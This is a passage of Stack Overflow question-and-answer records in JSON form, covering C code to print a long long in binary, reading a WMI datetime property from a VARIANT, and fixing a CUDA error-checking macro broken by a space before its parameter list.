48662991, "comment_id": 84326202, "body": "@Bathsheba yes, good nitpick. I rolled with the OPs input type, but it should be unsigned."}], "tags": [], "owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "is_accepted": false, "score": 1, "last_activity_date": 1518011538, "last_edit_date": 1518011538, "creation_date": 1518003852, "answer_id": 48662991, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48662991#48662991", "title": "Long Long Decimal Binary Representation using C", "body": "<p>Just to spell out some of the comments, the simplest thing to do is use a <code>char</code> array to hold the binary digits. Also, when dealing with bits, the bit-wise operators are a little more clear. Otherwise, I've kept your basic code structure.</p>\n\n<pre><code>int main()\n{\n    char bits[64];\n    int i = 0;\n    unsigned long long number;   // note the \"unsigned\" type here which makes more sense\n\n    scanf(\"%lld\", &amp;number);\n\n    while (number &gt; 0) {\n        bits[i++] = number &amp; 1; // get the current bit\n        number &gt;&gt;= 1;         // shift number right by 1 bit (divide by 2)\n    }\n\n    if ( i == 0 )   // The original number was 0!\n        printf(\"0\");\n\n    for ( ; i &gt; 0; i-- )\n        printf(\"%d\", bits[i]);  // or... putchar('0' + bits[i])\n\n    printf(\"\\n\");\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7497, "user_id": 1213227, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/78179ef730f268752c0f6fdde3943b99?s=128&d=identicon&r=PG", "display_name": "Matthias", "link": "https://stackoverflow.com/users/1213227/matthias"}, "is_accepted": false, "score": 0, "last_activity_date": 1518003896, "creation_date": 1518003896, "answer_id": 48662999, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48662999#48662999", "title": "Long Long Decimal Binary Representation using C", "body": "<p>If you don't mind to print the digits separately, you could use the following approach:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include&lt;limits.h&gt;\n\nvoid bindigit(long long num);\n\nint main()\n{\n    long long number, binaryRepresentation = 0, baseOfOne = 1, remainder;\n    scanf(\"%lld\", &amp;number);\n    bindigit(number);\n    printf(\"\\n\");\n\n}\n\nvoid bindigit(long long num) {\n  int remainder;\n  if (num &lt; 2LL) {\n    printf(\"%d\",(int)num);\n  } else {\n    remainder = num % 2;\n    bindigit(num/2);\n    printf(\"%d\",remainder);\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 2, "last_activity_date": 1518004441, "last_edit_date": 1518004441, "creation_date": 1518004063, "answer_id": 48663040, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48663040#48663040", "title": "Long Long Decimal Binary Representation using C", "body": "<p>Using a denary number to represent binary digits never ends particularly well: you'll be vulnerable to overflow for a surprisingly small input, and all subsequent arithmetic operations will be meaningless.</p>\n\n<p>Another approach is to print the numbers out as you go, but using a recursive technique so you print the numbers in the reverse order to which they are processed:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nunsigned long long output(unsigned long long n)\n{\n    unsigned long long m = n ? output(n / 2) : 0;\n    printf(\"%d\", (int)(n % 2));\n    return m;\n}\n\nint main()\n{\n    unsigned long long number = 9223372036854775807;\n    output(number);\n    printf(\"\\n\");\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>0111111111111111111111111111111111111111111111111111111111111111\n</code></pre>\n\n<p>I've also changed the type to <code>unsigned long long</code> which has a better defined bit pattern, and <code>%</code> does strange things for negative numbers anyway.</p>\n\n<p>Really though, all I'm doing here is abusing the stack as a way of storing what is really an array of zeros and ones.</p>\n"}, {"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 1, "creation_date": 1518006466, "post_id": 48663491, "comment_id": 84324828, "body": "Prefer <code>CHAR_BITS * sizeof(unsigned long long)</code> rather than hardcoding 70, although at least one other answerer has fallen for that. Also check the case of <code>number</code> being zero (my approach deals with that sloppily by always outputting a leading zero)."}], "tags": [], "owner": {"reputation": 131, "user_id": 9323603, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2fee4a1f0ad60f1ffca21dd3fceb1e87?s=128&d=identicon&r=PG&f=1", "display_name": "Blackdeath", "link": "https://stackoverflow.com/users/9323603/blackdeath"}, "is_accepted": false, "score": 0, "last_activity_date": 1518005487, "creation_date": 1518005487, "answer_id": 48663491, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48663491#48663491", "title": "Long Long Decimal Binary Representation using C", "body": "<p>Finally I tried a code myself with idea from your codes which worked,</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main() {\n   unsigned long long number;\n   int binaryRepresentation[70], remainder, counter, count = 0;\n   scanf(\"%llu\", &amp;number);\n   while(number &gt; 0) {\n       remainder = number % 2;\n       binaryRepresentation[count++] = remainder;\n       number = number / 2;\n   }\n   for(counter = count-1; counter &gt;= 0; counter--) {\n       printf(\"%d\", binaryRepresentation[counter]);\n   }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "is_accepted": false, "score": 1, "last_activity_date": 1518010544, "last_edit_date": 1518010544, "creation_date": 1518010181, "answer_id": 48665088, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c/48665088#48665088", "title": "Long Long Decimal Binary Representation using C", "body": "<p>As <a href=\"/a/48663040\">Bathsheba's answer</a> states, you need more space than is \navailable if you use a decimal number to represent a bit sequence like that.  </p>\n\n<p>Since you intend to print the result, it's best to do that one bit at a time.  We can do this by creating a <strong>mask</strong> with only the highest bit set.  The magic to create this for any type is to complement a zero of that type to get an \"all ones\" number; we then subtract half of that (i.e. 1111.... - 0111....) to get only a single bit.  We can then shift it rightwards along the number to determine the state of each bit in turn.</p>\n\n<p>Here's a re-worked version using that logic, with the following other changes:</p>\n\n<ul>\n<li>I use a separate function, returning (like <code>printf</code>) the number of characters printed.</li>\n<li>I accept an unsigned value, as we were ignoring negative values anyway.</li>\n<li>I process arguments from the command line - I tend to find that more convenient that having to type stuff on stdin.</li>\n</ul>\n\n\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint print_binary(unsigned long long n)\n{\n    int printed = 0;\n    /* ~ZERO - ~ZERO/2 is the value 1000... of ZERO's type */\n    for (unsigned long long mask = ~0ull - ~0ull/2;  mask;  mask /= 2) {\n        if (putc(n &amp; mask ? '1' : '0', stdout) &lt; 0)\n            return EOF;\n        else\n            ++printed;\n    }\n    return printed;\n}\n\nint main(int argc, char **argv)\n{\n    for (int i = 1;  i &lt; argc;  ++i) {\n        print_binary(strtoull(argv[i], 0, 10));\n        puts(\"\");\n    }\n}\n</code></pre>\n\n<p>Exercises for the reader:</p>\n\n<ul>\n<li>Avoid printing leading zeros (hint: either keep a boolean flag that indicates you've seen the first <code>1</code>, or have a separate loop to shift the mask before printing).  Don't forget to check that <code>print_binary(0)</code> still produces output!</li>\n<li>Check for errors when using <code>strtoull</code> to convert the input values from decimal strings.</li>\n<li>Adapt the function to write to a character array instead of stdout.</li>\n</ul>\n"}], "owner": {"reputation": 131, "user_id": 9323603, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2fee4a1f0ad60f1ffca21dd3fceb1e87?s=128&d=identicon&r=PG&f=1", "display_name": "Blackdeath", "link": "https://stackoverflow.com/users/9323603/blackdeath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1171, "favorite_count": 0, "answer_count": 6, "score": 0, "last_activity_date": 1518011538, "creation_date": 1518002380, "last_edit_date": 1518002741, "question_id": 48662517, "link": "https://stackoverflow.com/questions/48662517/long-long-decimal-binary-representation-using-c", "title": "Long Long Decimal Binary Representation using C", "body": "<p>I've been trying to print out the Binary representation of a long long integer using <strong>C Programming</strong></p>\n\n<p>My code is </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include&lt;limits.h&gt;\n\nint main()\n{\n    long long number, binaryRepresentation = 0, baseOfOne = 1, remainder;\n    scanf(\"%lld\", &amp;number);\n    while(number &gt; 0) {\n        remainder = number % 2;\n        binaryRepresentation = binaryRepresentation + remainder * baseOfOne;\n        baseOfOne *= 10;\n        number = number / 2;\n    }\n    printf(\"%lld\\n\", binaryRepresentation);\n\n}\n</code></pre>\n\n<p>The above code works fine when I provide an input of <strong>5</strong> and fails when the number is <strong>9223372036854775807</strong> (0x7FFFFFFFFFFFFFFF).</p>\n\n<p>1.Test Case</p>\n\n<pre><code>5\n101\n</code></pre>\n\n<p>2.Test Case</p>\n\n<pre><code>9223372036854775807\n-1024819115206086201\n</code></pre>\n"}, {"tags": ["c", "wmi"], "comments": [{"owner": {"reputation": 22357, "user_id": 3439404, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5YzGh.jpg?s=128&g=1", "display_name": "JosefZ", "link": "https://stackoverflow.com/users/3439404/josefz"}, "edited": false, "score": 2, "creation_date": 1518027610, "post_id": 48662258, "comment_id": 84339331, "body": "<code>CIM_DATETIME</code> is a string (<a href=\"https://msdn.microsoft.com/en-us/library/aa387237(v=vs.85).aspx\" rel=\"nofollow noreferrer\">one of two fixed-length formats specific to <i>WMI</i> and <i>CIM</i></a>).  I&#39;m not fluent in <code>c</code> however in scripting, use the <code>SWbemDateTime</code> object to convert these to regular dates and times."}], "answers": [{"comments": [{"owner": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "edited": false, "score": 0, "creation_date": 1518081504, "post_id": 48674041, "comment_id": 84360503, "body": "The heck ... Thanks, I guess I will just have to do as you say : see in propertyValue with a debugger (I can&#39;t believe I didn&#39;t think of that, I have a long way to go)."}], "tags": [], "owner": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "is_accepted": true, "score": 1, "last_activity_date": 1518041066, "creation_date": 1518041066, "answer_id": 48674041, "question_id": 48662258, "link": "https://stackoverflow.com/questions/48662258/get-propertys-value-of-date/48674041#48674041", "title": "Get property&#39;s value of date", "body": "<p><code>propertyValue.date</code> is <code>double</code>, it needs <code>\"%g\"</code> print format, but it's probably not valid. Try <code>bstrVal</code> value instead:</p>\n\n<pre><code>case CIM_DATETIME:\n    //wprintf(L\"%g\\n\", propertyValue.date);\n    wprintf(L\"%s\\n\", propertyValue.bstrVal);\n    break;\n</code></pre>\n\n<p><sup>Note, in debug mode you can move the cursor over <code>propertyValue</code> and it should show the values contained in <code>propertyValue</code></sup></p>\n"}], "owner": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "accepted_answer_id": 48674041, "answer_count": 1, "score": 1, "last_activity_date": 1518041066, "creation_date": 1518001540, "question_id": 48662258, "link": "https://stackoverflow.com/questions/48662258/get-propertys-value-of-date", "title": "Get property&#39;s value of date", "body": "<p>I'm currently writing a C program which have to do WMI query.\nI can issue a query without trouble, but it begin to be really hard when it come to retrieve property's value from the VARIANT variable.</p>\n\n<p>I have a huge switch case, and for each case I just want to wprintf the value (the final purpose is to retrieve the value in a wchar_t string).</p>\n\n<p>So far, for the integer type, it wasn't so difficult, but for the datetime type, I can't have something at all.</p>\n\n<p>Here's the example i'm working on (there are no function check for the sake of lisibility, but I do it :</p>\n\n<pre><code>typedef struct cpwmi {\n    IWbemLocator         *locator;\n    IWbemServices        *services;\n    IEnumWbemClassObject *results;\n    IWbemClassObject     *result;\n} cpwmi_s;\n\nvoid CpWmi_Constructor(cpwmi_s *self)\n{\n    self-&gt;locator = NULL;\n    self-&gt;services = NULL;\n    self-&gt;results = NULL;\n    self-&gt;result = NULL;\n}\n\nvoid CpWmi_Destructor(cpwmi_s *self)\n{\n    if (self-&gt;result) {\n        self-&gt;result-&gt;lpVtbl-&gt;Release(self-&gt;result);\n    }\n    if (self-&gt;results) {\n        self-&gt;results-&gt;lpVtbl-&gt;Release(self-&gt;results);\n    }\n    if (self-&gt;services) {\n        self-&gt;services-&gt;lpVtbl-&gt;Release(self-&gt;services);\n    }\n    if (self-&gt;locator) {\n        self-&gt;locator-&gt;lpVtbl-&gt;Release(self-&gt;locator);\n    }\n}\n\n\nvoid CpWmi_MinimalExample(cpwmi_s *self)\n{\n    // Connection\n    CoCreateInstance(&amp;CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &amp;IID_IWbemLocator, &amp;self-&gt;locator);\n\n    BSTR ressource = SysAllocString(L\"ROOT\\\\CIMV2\");\n    self-&gt;locator-&gt;lpVtbl-&gt;ConnectServer(self-&gt;locator, ressource, NULL, NULL, NULL, 0, NULL, NULL, &amp;self-&gt;services);\n    SysFreeString(ressource);\n\n    // Issue WMI query\n    BSTR query = SysAllocString(L\"SELECT ReleaseDate FROM Win32_BIOS\");\n    BSTR language = SysAllocString(L\"WQL\");\n    self-&gt;services-&gt;lpVtbl-&gt;ExecQuery(self-&gt;services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &amp;self-&gt;results);\n    SysFreeString(query);\n    SysFreeString(language);\n\n    // Go to first result\n    ULONG   count = 0;\n    self-&gt;results-&gt;lpVtbl-&gt;Next(self-&gt;results, WBEM_INFINITE, 1, &amp;self-&gt;result, &amp;count);\n\n    // Get propperty's value\n    BSTR    propertyName = SysAllocString(L\"ReleaseDate\");\n    VARIANT propertyValue;\n    CIMTYPE propertyType;\n    self-&gt;result-&gt;lpVtbl-&gt;Get(self-&gt;result, propertyName, 0, &amp;propertyValue, &amp;propertyType, 0);\n    wprintf(L\"%s: \", propertyName);\n\n    if (propertyValue.vt != VT_NULL &amp;&amp; propertyValue.vt != VT_EMPTY) {\n        switch (propertyType) {\n            /* Many case here */\n        case CIM_DATETIME:\n            wprintf(L\"%f\", propertyValue.date);\n            break;\n        }\n    }\n    VariantClear(&amp;propertyValue);\n    wprintf(L\"\\n\");\n}\n\nint main(void)\n{\n    cpwmi_s wmi;\n\n    CpWmi_Constructor(&amp;wmi);\n\n    // initialize COM\n    CoInitializeEx(NULL, COINIT_MULTITHREADED);\n    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);\n\n    CpWmi_MinimalExample(&amp;wmi);\n\n    CpWmi_Destructor(&amp;wmi);\n\n    // unwind everything else we've allocated\n    CoUninitialize();\n\n    printf(\"Stop\\n\");\n    getchar();\n    return;\n}\n</code></pre>\n\n<p>I expect to have something like</p>\n\n<p>ReleaseDate : 20140401000000.000000+000</p>\n\n<p>but I end up with </p>\n\n<p>ReleaseDate : -92559592126069970772275711289628980735378270670621907468943360.000000</p>\n\n<p>I must misread msdn documentation or don't know how to search/read, because up to this point, I have no idea how to do that in C !\nI'm also worried about CIM_REFERENCE_TYPE, CIM_OBJECT_TYPE and the alike.</p>\n\n<p>Is there anyone who have a hint or know to do that ?</p>\n"}, {"tags": ["c", "cuda", "macros", "parameter-passing", "nvcc"], "comments": [{"owner": {"reputation": 1222, "user_id": 1576803, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/5fPDS.gif?s=128&g=1", "display_name": "aram", "link": "https://stackoverflow.com/users/1576803/aram"}, "edited": false, "score": 0, "creation_date": 1518018017, "post_id": 48661899, "comment_id": 84333094, "body": "You&#39;re missing the cuda headers."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518019095, "post_id": 48661899, "comment_id": 84333930, "body": "Tangential: Note that you shouldn&#39;t create function or variable names that start with an underscore, in general. <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.1.3\" rel=\"nofollow noreferrer\">C11 &#167;7.1.3 Reserved identifiers</a> says: \u2014 <i>All identifiers that begin with an underscore and either an uppercase letter or another underscore are always reserved for any use.</i> \u2014 <i>All identifiers that begin with an underscore are always reserved for use as identifiers with file scope in both the ordinary and tag name spaces.</i> See also <a href=\"https://stackoverflow.com/a/1449301/15168\">What does double underscore (<code>__const</code>) mean in C?</a>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518019203, "post_id": 48661899, "comment_id": 84333998, "body": "The error message is from compiling <code>addkernel.cu</code> \u2014 but that&#39;s one chunk of code that is missing from the question.   We can&#39;t help you debug code we can&#39;t see."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518019308, "post_id": 48661899, "comment_id": 84334060, "body": "@JonathanLeffler what are you referring to specifically regarding the underscore?  <code>__global__</code> is CUDA-specific syntax.  It wasn&#39;t created by OP."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "edited": false, "score": 0, "creation_date": 1518019357, "post_id": 48661899, "comment_id": 84334092, "body": "@RobertCrovella: I&#39;m referring primarily to <code>#ifndef __GENERAL_H__</code> in the user&#39;s own <code>general.h</code> header.  If <code>__global__</code> is CUDA-specific syntax, it is exempt \u2014 it is defined by the implementation and the user isn&#39;t creating it, as you say."}, {"owner": {"reputation": 119299, "user_id": 1695960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f9f557c03db19232aa410540af2f966?s=128&d=identicon&r=PG", "display_name": "Robert Crovella", "link": "https://stackoverflow.com/users/1695960/robert-crovella"}, "edited": false, "score": 0, "creation_date": 1518020018, "post_id": 48661899, "comment_id": 84334562, "body": "in that case I believe OP is following an example from a set of header files that are provided for code examples in the Cuda By Example book.  <a href=\"https://github.com/jiekebo/CUDA-By-Example/blob/master/common/book.h#L17\" rel=\"nofollow noreferrer\">Here</a> is one such example.  I acknowledge your stated concern, of course.  However the blame probably equally rests with the book&#39;s authors, perhaps."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518045919, "post_id": 48661899, "comment_id": 84348507, "body": "@JonathanLeffler Robert is correct. I thought it was a convention. The main code is in addkernel.cu, I have mistakenly named it and I have corrected it."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "reply_to_user": {"reputation": 1222, "user_id": 1576803, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/5fPDS.gif?s=128&g=1", "display_name": "aram", "link": "https://stackoverflow.com/users/1576803/aram"}, "edited": false, "score": 0, "creation_date": 1518045991, "post_id": 48661899, "comment_id": 84348526, "body": "@Aram If I put all the codes in one file, there would be no problems compiling the code. I haven&#39;t been using any cuda headers so far. Coding this on a linux machine btw."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "edited": false, "score": 0, "creation_date": 1518046159, "post_id": 48661899, "comment_id": 84348586, "body": "btw thanks guys I really need this to work :("}, {"owner": {"reputation": 1222, "user_id": 1576803, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/5fPDS.gif?s=128&g=1", "display_name": "aram", "link": "https://stackoverflow.com/users/1576803/aram"}, "edited": false, "score": 0, "creation_date": 1518047783, "post_id": 48661899, "comment_id": 84349081, "body": "Add the &#39;single file&#39; code example to your question."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518054303, "post_id": 48661899, "comment_id": 84350774, "body": "The best I can do is point out that the C standard says that the advice in the book is dubious.  You can ignore me and the standard and I won&#39;t be offended, and you&#39;ll most likely get away with, right up until you don&#39;t and then you&#39;ll have no recourse but to change your code because it violates the standard.  This will usually happen when it is most inconvenient."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518055601, "post_id": 48661899, "comment_id": 84351083, "body": "@JonathanLeffler Actually I find it strange too. I will not adopt it from now on."}, {"owner": {"reputation": 6004, "user_id": 6471538, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Robert Columbia", "link": "https://stackoverflow.com/users/6471538/robert-columbia"}, "edited": false, "score": 1, "creation_date": 1518055637, "post_id": 48661899, "comment_id": 84351093, "body": "Please don&#39;t add your solution into your question. Post it as an answer."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "reply_to_user": {"reputation": 6004, "user_id": 6471538, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Robert Columbia", "link": "https://stackoverflow.com/users/6471538/robert-columbia"}, "edited": false, "score": 0, "creation_date": 1518055806, "post_id": 48661899, "comment_id": 84351132, "body": "@RobertColumbia Thanks I&#39;ll keep that in mind."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518055837, "post_id": 48661899, "comment_id": 84351141, "body": "FWIW (not much), I typically use <code>#ifndef GENERAL_H_INCLUDED</code> at the start of a header <code>general.h</code>.  I&#39;ve seen quite a variety of alternative notations (and a lot of notations that break the rules of the standard), including <code>GENERAL_DOT_H</code> or even <code>GENERAL_DOT_H_INCLUDED</code>.  If you&#39;re really concerned about name collisions, consider using an MD5 hash of the header file contents."}, {"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518056233, "post_id": 48661899, "comment_id": 84351226, "body": "@JonathanLeffler I have have to ask. Any recommendations on great resources to improve my C programmming skills? I&#39;m currently using Lu&#39;s Intermediate Programming in C book."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518109883, "post_id": 48661899, "comment_id": 84380351, "body": "There&#39;s a fairly good <a href=\"https://stackoverflow.com/questions/tagged/c\">c</a> tag on Stack Overflow for general C question.  There&#39;s the <a href=\"https://stackoverflow.com/questions/562303/the-definitive-c-book-guide-and-list\">Definitive C Book List and Guide</a> question specifically.  There are numerous good Unix/POSIX programming books that might be relevant.  Once you delve into Arduino and CUDA, you&#39;re moving outside my realm of expertise \u2014 and beware asking on SO about that as they&#39;re external resources and hence off-topic."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "edited": false, "score": 0, "creation_date": 1518055369, "post_id": 48676212, "comment_id": 84351032, "body": "Thanks so much! This is what I&#39;m looking for."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 1, "last_activity_date": 1518058010, "last_edit_date": 1518058010, "creation_date": 1518054580, "answer_id": 48676212, "question_id": 48661899, "link": "https://stackoverflow.com/questions/48661899/macro-parameter-wont-take-argument-passed-nvcc/48676212#48676212", "title": "macro parameter won&#39;t take argument passed (nvcc)", "body": "<p>Spacing matters in macro definitions.  You have:</p>\n\n<pre><code>#define CUDA_ERROR ( err ) (CudaErrorCheck( err, __FILE__, __LINE__ )) \n</code></pre>\n\n<p>You need (minimal change \u2014 delete one space):</p>\n\n<pre><code>#define CUDA_ERROR( err ) (CudaErrorCheck( err, __FILE__, __LINE__ )) \n</code></pre>\n\n<p>With a function-like macro, there cannot be white space between the macro name and the open parenthesis of the argument list of the macro definition.  When it comes to using the macro, white space is allowed between the macro name and the open parenthesis of the argument list.</p>\n\n<p>I'd write:</p>\n\n<pre><code>#define CUDA_ERROR(err) CudaErrorCheck(err, __FILE__, __LINE__)\n</code></pre>\n\n<p>The extra parentheses around the whole expansion aren't really necessary, and I don't much like white space around parentheses.  Different people have different views on this, so I'm stating my preference without in any sense demanding that you use it (but obviously suggesting that you consider it).</p>\n\n<p>Because of the space, your code was expanding to look like:</p>\n\n<pre><code>( err ) (CudaErrorCheck( err, \"addkernel.cu\", 19 ))( cudaMalloc( (void **) &amp;d_out, sizeof(float) * N ) );\n</code></pre>\n\n<p>and <code>err</code> was diagnosed as an undefined identifier, making the cast invalid.</p>\n"}], "owner": {"reputation": 21, "user_id": 2693271, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000374315475/picture?type=large", "display_name": "Sunny Hill", "link": "https://stackoverflow.com/users/2693271/sunny-hill"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 133, "favorite_count": 0, "accepted_answer_id": 48676212, "answer_count": 1, "score": 0, "last_activity_date": 1518058010, "creation_date": 1518000529, "last_edit_date": 1518055652, "question_id": 48661899, "link": "https://stackoverflow.com/questions/48661899/macro-parameter-wont-take-argument-passed-nvcc", "title": "macro parameter won&#39;t take argument passed (nvcc)", "body": "<p>I'm just starting to code on CUDA and I'm trying to 